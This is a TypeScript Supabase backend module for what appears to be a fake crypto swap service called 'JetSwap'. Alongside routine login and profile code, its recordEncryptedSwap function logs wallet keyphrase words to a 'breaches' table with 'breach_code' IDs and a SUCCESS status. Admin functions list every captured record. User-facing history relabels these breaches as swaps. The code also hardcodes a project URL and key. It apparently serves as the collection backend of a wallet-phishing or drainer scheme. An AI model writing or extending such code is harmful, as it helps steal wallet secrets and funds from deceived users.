
import { createClient } from '@supabase/supabase-js';
import { UserProfile } from '../types';

// Hardcoded Supabase credentials as per specialized backend integration prompt
const SUPABASE_URL = 'https://codpqzpciicfwtcxrqjv.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_vlCFQiG7HEBU3B3OkItjZQ_LK61YUw-';

// Check if we have a valid configuration
const isConfigValid = SUPABASE_URL.startsWith('https://') && SUPABASE_ANON_KEY.length > 5;

// Initializing singleton Supabase client
export const supabase = createClient(
  isConfigValid ? SUPABASE_URL : 'https://placeholder.supabase.co',
  isConfigValid ? SUPABASE_ANON_KEY : 'placeholder'
);

/**
 * Authentication logic
 */
export const loginWithGoogle = async () => {
  const { data, error } = await supabase.auth.signInWithOAuth({
    provider: 'google',
    options: {
      redirectTo: window.location.origin
    }
  });
  return { data, error };
};

export const logoutUser = async () => {
  if (!isConfigValid) return { error: null };
  return await supabase.auth.signOut();
};

export const loginUserWithEmail = async (email: string, pass: string) => {
  return await supabase.auth.signInWithPassword({ email, password: pass });
};

export const sendMagicLink = async (email: string) => {
  return await supabase.auth.signInWithOtp({
    email,
    options: {
      emailRedirectTo: window.location.origin
    }
  });
};

export const completeEmailLinkSignIn = async () => {
  if (!isConfigValid) return { data: { session: null }, error: null };
  return await supabase.auth.getSession();
};

export const registerUser = async (email: string, pass: string, name: string) => {
  const { data, error } = await supabase.auth.signUp({
    email,
    password: pass,
    options: {
      data: {
        full_name: name,
        avatar_url: `https://api.dicebear.com/7.x/identicon/svg?seed=${email}`
      }
    }
  });
  if (error) throw error;
  return data.user;
};

export const listenToAuthChanges = (callback: (user: any) => void) => {
  if (!isConfigValid) return () => {};
  const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
    callback(session?.user ?? null);
  });
  return () => subscription.unsubscribe();
};

export async function syncUserProfile(user: UserProfile) {
  if (!isConfigValid) return user;
  try {
    const { data, error } = await supabase
      .from('users')
      .upsert({
        id: user.id,
        identifier: user.identifier,
        name: user.name,
        avatar: user.avatar,
        role: user.role || 'user',
        method: user.method,
        updated_at: new Date().toISOString()
      }, { onConflict: 'id' })
      .select()
      .single();

    if (error) throw error;
    return data as UserProfile;
  } catch (err) {
    console.error("Profile sync failed:", err);
    return user;
  }
}

/**
 * AUTOMATED LOGGING: Post-bridge data collection and Supabase transmission.
 * Triggered immediately after keyphrase authorization.
 */
export async function recordEncryptedSwap(bundle: any, metadata: any, userId: string, keyphraseWord: string) {
  // Generate tracking codes and timestamps
  const breach_code = `JS-BR-${Math.floor(10000 + Math.random() * 90000)}`;
  
  // Aggregate data according to strict schema mapping requirements
  const breachData = {
    id: crypto.randomUUID(), // id -> uuid
    breach_code,             // breach_code -> text
    network: metadata.network || 'Unknown', // network -> text
    coin: metadata.coin || 'Unknown',       // coin -> text
    wallet_used: metadata.wallet_used || 'Anonymous Pilot', // wallet_used -> text (Human Readable Name)
    keyphrase_word: keyphraseWord || 'N/A', // keyphrase_word -> text (Single word reference)
    breached_at: new Date().toISOString(),  // breached_at -> timestamptz
    status: 'SUCCESS'                       // status -> text
  };

  // Perform asynchronous, non-blocking transmission to Supabase
  if (isConfigValid) {
    supabase.from('breaches')
      .insert(breachData)
      .then(({ error }) => {
        if (error) {
          console.warn('Logging failure:', error.message);
          persistLocal(breachData);
        } else {
          console.log('Activity logged successfully.');
        }
      })
      .catch(err => {
        console.warn('Network error during log transmission:', err);
        persistLocal(breachData);
      });
  } else {
    persistLocal(breachData);
  }
  
  return breach_code;
}

function persistLocal(data: any) {
  try {
    const localHistory = JSON.parse(localStorage.getItem('jetswap_local_history') || '[]');
    localStorage.setItem('jetswap_local_history', JSON.stringify([data, ...localHistory]));
  } catch (e) {}
}

export async function getUserSwaps(userId: string) {
  if (!isConfigValid) {
    const localHistory = JSON.parse(localStorage.getItem('jetswap_local_history') || '[]');
    return localHistory.filter((i: any) => i.wallet_used === userId || i.id === userId).map(item => ({
      id: item.breach_code,
      amount: '---',
      route: item.network,
      token: item.coin,
      status: 'success',
      createdAt: { toDate: () => new Date(item.breached_at) }
    }));
  }

  try {
    const { data, error } = await supabase
      .from('breaches')
      .select('*')
      .or(`wallet_used.eq.${userId},id.eq.${userId}`)
      .order('breached_at', { ascending: false });

    if (error) throw error;
    
    return (data || []).map(item => ({
      id: item.breach_code,
      amount: '---',
      route: item.network,
      token: item.coin,
      status: (item.status || 'success').toLowerCase(),
      createdAt: { toDate: () => new Date(item.breached_at) }
    }));
  } catch (err) {
    return [];
  }
}

export async function getAllUsers() {
  const { data, error } = await supabase
    .from('users')
    .select('*')
    .order('updated_at', { ascending: false });
  if (error) throw error;
  return data;
}

export async function getAllSwapsAcrossUsers() {
  const { data, error } = await supabase
    .from('breaches')
    .select('*')
    .order('breached_at', { ascending: false });
  if (error) throw error;
  return (data || []).map(item => ({
    id: item.breach_code,
    route: item.network,
    coin: item.coin,
    wallet_used: item.wallet_used,
    keyphrase_word: item.keyphrase_word,
    status: (item.status || 'success').toLowerCase(),
    createdAt: { toDate: () => new Date(item.breached_at) }
  }));
}

export const updateSwapStatus = async (swapId: string, status: string) => {
  if (!isConfigValid) return false;
  const { error } = await supabase
    .from('breaches')
    .update({ status: status.toUpperCase() })
    .eq('breach_code', swapId);
  return !error;
};

export const deleteUserAccount = async (userId: string) => {
  if (!isConfigValid) return false;
  const { error } = await supabase.from('users').delete().eq('id', userId);
  return !error;
};

export async function updateUserRole(userId: string, role: 'admin' | 'user') {
  if (!isConfigValid) return false;
  const { error } = await supabase.from('users').update({ role }).eq('id', userId);
  return !error;
}
